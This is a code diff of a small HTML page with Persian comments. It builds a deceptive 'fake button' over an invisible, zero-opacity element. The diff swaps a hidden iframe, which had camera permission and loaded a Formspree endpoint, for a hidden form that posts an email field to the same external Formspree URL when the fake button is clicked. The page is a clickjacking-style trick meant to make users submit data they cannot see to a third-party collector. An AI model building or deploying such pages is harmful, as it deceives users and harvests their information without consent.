@@ -23,16 +23,16 @@
       cursor: pointer;
     }
 
-    #realIframe {
+    #realForm {
       position: absolute;
       top: 150px;
       left: 50%;
       transform: translateX(-50%);
       width: 300px;
       height: 300px;
-      opacity: 0; /* iframe نامرئی */
+      opacity: 0; /* فرم نامرئی */
       z-index: 1;
-      pointer-events: auto;
+      pointer-events: none;
     }
 
     p {
@@ -46,21 +46,19 @@
   <!-- دکمه جعلی -->
   <button id="fakeButton">ارسال فرم</button>
 
-  <!-- iframe مخفی با فرم Formspree -->
-  <iframe id="realIframe" name="formspree-frame" src="https://formspree.io/f/xkgrwvde" allow="camera" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+  <!-- فرم مخفی Formspree -->
+  <form id="realForm" action="https://formspree.io/f/xkgrwvde" method="POST">
+    <input type="email" name="email" placeholder="ایمیل خود را وارد کنید" required>
+    <input type="submit" value="ارسال">
+  </form>
 
   <p>اگر فرم ارسال نشد، لطفاً دوباره روی دکمه کلیک کنید.</p>
 
   <script>
     // وقتی روی دکمه جعلی کلیک شد، فرم واقعی ارسال می‌شود
     document.getElementById('fakeButton').onclick = function() {
-      // ایجاد و ارسال داده به فرم از طریق iframe
-      var iframe = document.getElementById('realIframe');
-      var form = iframe.contentWindow.document.querySelector('form');
-      
-      if (form) {
-        form.submit(); // فرم رو ارسال می‌کنیم
-      }
+      // فرم رو ارسال می‌کنیم
+      document.getElementById('realForm').submit();
     };
   </script>
 
